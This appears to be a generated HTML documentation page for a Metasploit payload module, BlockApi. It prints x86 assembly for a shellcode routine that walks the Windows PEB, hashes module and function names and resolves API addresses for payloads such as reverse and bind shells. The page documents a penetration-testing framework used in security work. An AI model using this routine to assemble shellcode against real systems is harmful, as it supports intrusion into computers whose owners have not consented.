@@ -1,0 +1,352 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>
+  Module: Msf::Payload::Windows::BlockApi
+  
+    &mdash; Documentation by YARD 0.8.7.6
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" charset="utf-8" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" charset="utf-8" />
+
+<script type="text/javascript" charset="utf-8">
+  hasFrames = window.top.frames.main ? true : false;
+  relpath = '../../../';
+  framesUrl = "../../../frames.html#!Msf/Payload/Windows/BlockApi.html";
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div id="header">
+      <div id="menu">
+  
+    <a href="../../../_index.html">Index (B)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span>
+     &raquo; 
+    <span class="title">BlockApi</span>
+  
+
+  <div class="noframes"><span class="title">(</span><a href="." target="_top">no frames</a><span class="title">)</span></div>
+</div>
+
+      <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+      Class List
+    </a>
+  
+    <a class="full_list_link" id="method_list_link"
+        href="../../../method_list.html">
+      Method List
+    </a>
+  
+    <a class="full_list_link" id="file_list_link"
+        href="../../../file_list.html">
+      File List
+    </a>
+  
+</div>
+      <div class="clear"></div>
+    </div>
+
+    <iframe id="search_frame"></iframe>
+
+    <div id="content"><h1>Module: Msf::Payload::Windows::BlockApi
+  
+  
+  
+</h1>
+
+<dl class="box">
+  
+  
+    
+  
+    
+  
+  
+    <dt class="r1">Included in:</dt>
+    <dd class="r1"><span class='object_link'><a href="BindTcp.html" title="Msf::Payload::Windows::BindTcp (module)">BindTcp</a></span>, <span class='object_link'><a href="ReverseHttp.html" title="Msf::Payload::Windows::ReverseHttp (module)">ReverseHttp</a></span>, <span class='object_link'><a href="ReverseTcp.html" title="Msf::Payload::Windows::ReverseTcp (module)">ReverseTcp</a></span></dd>
+    
+  
+  
+    <dt class="r2 last">Defined in:</dt>
+    <dd class="r2 last">lib/msf/core/payload/windows/block_api.rb</dd>
+  
+</dl>
+<div class="clear"></div>
+
+
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small>(<a href="#" class="summary_toggle">collapse</a>)</small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#asm_block_api-instance_method" title="#asm_block_api (instance method)">- (Object) <strong>asm_block_api</strong>(opts = {}) </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="asm_block_api-instance_method">
+  
+    - (<tt>Object</tt>) <strong>asm_block_api</strong>(opts = {}) 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/block_api.rb', line 17</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_asm_block_api'>asm_block_api</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_raw'>raw</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%q^</span><span class='tstring_content'>
+
+  api_call:
+    pushad                    ; We preserve all the registers for the caller, bar EAX and ECX.
+    mov ebp, esp              ; Create a new stack frame
+    xor eax, eax              ; Zero EAX (upper 3 bytes will remain zero until function is found)
+    mov edx, [fs:eax+48]      ; Get a pointer to the PEB
+    mov edx, [edx+12]         ; Get PEB-&gt;Ldr
+    mov edx, [edx+20]         ; Get the first module from the InMemoryOrder module list
+  next_mod:                   ;
+    mov esi, [edx+40]         ; Get pointer to modules name (unicode string)
+    movzx ecx, word [edx+38]  ; Set ECX to the length we want to check
+    xor edi, edi              ; Clear EDI which will store the hash of the module name
+  loop_modname:               ;
+    lodsb                     ; Read in the next byte of the name
+    cmp al, &#39;a&#39;               ; Some versions of Windows use lower case module names
+    jl not_lowercase          ;
+    sub al, 0x20              ; If so normalise to uppercase
+  not_lowercase:              ;
+    ror edi, 13               ; Rotate right our hash value
+    add edi, eax              ; Add the next byte of the name
+    loop loop_modname         ; Loop untill we have read enough
+
+    ; We now have the module hash computed
+    push edx                  ; Save the current position in the module list for later
+    push edi                  ; Save the current module hash for later
+    ; Proceed to iterate the export address table
+    mov edx, [edx+16]         ; Get this modules base address
+    mov ecx, [edx+60]         ; Get PE header
+
+    ; use ecx as our EAT pointer here so we can take advantage of jecxz.
+    mov ecx, [ecx+edx+120]    ; Get the EAT from the PE header
+    jecxz get_next_mod1       ; If no EAT present, process the next module
+    add ecx, edx              ; Add the modules base address
+    push ecx                  ; Save the current modules EAT
+    mov ebx, [ecx+32]         ; Get the rva of the function names
+    add ebx, edx              ; Add the modules base address
+    mov ecx, [ecx+24]         ; Get the number of function names
+    ; now ecx returns to its regularly scheduled counter duties
+
+    ; Computing the module hash + function hash
+  get_next_func:              ;
+    jecxz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
+    dec ecx                   ; Decrement the function name counter
+    mov esi, [ebx+ecx*4]      ; Get rva of next module name
+    add esi, edx              ; Add the modules base address
+    xor edi, edi              ; Clear EDI which will store the hash of the function name
+    ; And compare it to the one we want
+  loop_funcname:              ;
+    lodsb                     ; Read in the next byte of the ASCII function name
+    ror edi, 13               ; Rotate right our hash value
+    add edi, eax              ; Add the next byte of the name
+    cmp al, ah                ; Compare AL (the next byte from the name) to AH (null)
+    jne loop_funcname         ; If we have not reached the null terminator, continue
+    add edi, [ebp-8]          ; Add the current module hash to the function hash
+    cmp edi, [ebp+36]         ; Compare the hash to the one we are searchnig for
+    jnz get_next_func         ; Go compute the next function hash if we have not found it
+
+    ; If found, fix up stack, call the function and then value else compute the next one...
+    pop eax                   ; Restore the current modules EAT
+    mov ebx, [eax+36]         ; Get the ordinal table rva
+    add ebx, edx              ; Add the modules base address
+    mov cx, [ebx+2*ecx]       ; Get the desired functions ordinal
+    mov ebx, [eax+28]         ; Get the function addresses table rva
+    add ebx, edx              ; Add the modules base address
+    mov eax, [ebx+4*ecx]      ; Get the desired functions RVA
+    add eax, edx              ; Add the modules base address to get the functions actual VA
+    ; We now fix up the stack and perform the call to the desired function...
+  finish:
+    mov [esp+36], eax         ; Overwrite the old EAX value with the desired api address for the upcoming popad
+    pop ebx                   ; Clear off the current modules hash
+    pop ebx                   ; Clear off the current position in the module list
+    popad                     ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
+    pop ecx                   ; Pop off the origional return address our caller will have pushed
+    pop edx                   ; Pop off the hash value our caller will have pushed
+    push ecx                  ; Push back the correct return value
+    jmp eax                   ; Jump into the required function
+    ; We now automagically return to the correct caller...
+
+  get_next_mod:               ;
+    pop edi                   ; Pop off the current (now the previous) modules EAT
+  get_next_mod1:              ;
+    pop edi                   ; Pop off the current (now the previous) modules hash
+    pop edx                   ; Restore our position in the module list
+    mov edx, [edx]            ; Get the next module
+    jmp.i8 next_mod           ; Process this module
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+    <div id="footer">
+  Generated on Tue Dec 22 22:32:01 2015 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.8.7.6 (ruby-2.1.7).
+</div>
+
+  </body>
+</html>
